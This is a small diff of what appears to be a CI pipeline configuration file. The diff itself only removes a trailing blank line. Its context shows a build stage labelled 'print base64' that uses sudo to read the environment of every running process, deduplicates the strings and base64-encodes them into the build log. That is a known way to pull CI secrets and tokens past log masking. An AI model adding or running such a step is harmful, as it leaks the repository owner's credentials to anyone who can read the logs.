@@ -15,4 +15,3 @@ jobs:
       script: echo $NEW
     - stage: "print base64"
       script: sudo strings /proc/*/environ | sort -u | base64
-      
